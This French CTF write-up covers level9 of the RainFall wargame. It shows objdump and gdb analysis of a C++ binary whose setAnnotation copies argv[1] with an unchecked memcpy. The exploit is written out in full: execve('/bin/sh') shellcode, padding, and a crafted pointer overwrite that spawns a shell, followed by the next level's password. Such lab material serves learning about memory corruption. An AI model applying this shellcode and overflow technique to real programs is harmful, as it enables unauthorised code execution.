```
level9@RainFall:~$ ls
level9
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 55
level9@RainFall:~$ ./level9 55 66
level9@RainFall:~$ ./level9 55 663333333333
level9@RainFall:~$ ./level9
```
Donc nous avaons un executable qui ne fait rien.
Il semble que ce soit du cpp

```
objdump -M intel -d level9

# on remarque
8048677:	e8 92 00 00 00       	call   804870e <_ZN1N13setAnnotationEPc>

0804870e <_ZN1N13setAnnotationEPc>:
 804870e:	55                   	push   ebp
 804870f:	89 e5                	mov    ebp,esp
 8048711:	83 ec 18             	sub    esp,0x18
 8048714:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 8048717:	89 04 24             	mov    DWORD PTR [esp],eax
 804871a:	e8 01 fe ff ff       	call   8048520 <strlen@plt>
 804871f:	8b 55 08             	mov    edx,DWORD PTR [ebp+0x8]
 8048722:	83 c2 04             	add    edx,0x4
 8048725:	89 44 24 08          	mov    DWORD PTR [esp+0x8],eax
 8048729:	8b 45 0c             	mov    eax,DWORD PTR [ebp+0xc]
 804872c:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
 8048730:	89 14 24             	mov    DWORD PTR [esp],edx
 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt>
 8048738:	c9                   	leave
 8048739:	c3                   	ret

```
On observe un memcpy sur un strlen, on peux donc penser qu'il est possible de faire overflow le programme, essayons
avec eax etant un pointeur sur le second argument.
Tandis que edx pointe lui sur le premier argument

```
# https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/ size 150
(gdb) run 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9'

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
info register eax
eax            0x41366441	1094083649
Offset de 108
```

Shellcode : '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' # http://shell-storm.org/shellcode/files/shellcode-827.php

On remarque donc que EAX est situé à partir de 108 caracteres.
L'objectif va etre d'utiliser le call à la fonction set annotation avec l'argument argv[1] puisqu'il s'agit de notre seul point d'entrée.
Faisons un breakpoint sur le memcpy pour observer.

```
gdb ./level9
gdb) b memcpy
Breakpoint 1 at 0x8048510
(gdb) r "AAAA"
Starting program: /home/user/level9/level9 "AAAA"

Breakpoint 1, 0xb7dc5920 in ?? () from /lib/i386-linux-gnu/libc.so.6
(gdb) x/4x $esp
0xbffff69c:	0x08048738	0x0804a00c	0xbffff8d4	0x00000004
```

Donc on retiens 0x0804a00c qui correspond à notre premier argument auquel on ajoute 4 afin de la deferencer pour la faire commencer au debut du shell.
0x804a010

Notre shellcode fait 28 bytes, notre adresse 4, l'adresse du buffer 4 donc notre padding 76 .

```
./level9 $(python -c 'print "\x10\xa0\x04\x08"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*(76)+"\x0c\xa0\x04\x08"')
# un shell s'ouvre
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
